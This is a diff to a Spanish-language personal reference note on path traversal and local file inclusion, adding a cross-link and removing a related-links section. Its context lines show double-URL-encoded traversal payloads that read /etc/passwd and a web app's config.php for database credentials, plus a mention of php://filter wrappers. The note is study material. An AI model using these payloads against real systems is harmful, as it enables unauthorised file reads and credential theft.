@@ -11,6 +11,7 @@ tags:
 
 > [!info] Referencia pura, no un zettel
 > Leer archivos fuera del directorio previsto. La base de LFI también. Criterio en [[LFI - inclusión local]]. `yi``  ` copia.
+> El criterio y la decisión, en [[MOC - File inclusion]].
 
 ## 0. Confirmar
 
@@ -73,7 +74,3 @@ En versiones modernas el null byte no va; se pasa a wrappers (`php://filter`) �
 3. ?file=..%252f..%252f..%252fetc/passwd  → root:x:0:0  → doble encode pasa
 4. ?file=..%252f..%252f..%252fvar/www/html/config.php  → credenciales de la DB
 ```
-
-## Relacionadas
-
-[[LFI - inclusión local]] · [[MOC - File inclusion]] · [[LFI wrappers - matriz de referencia]]
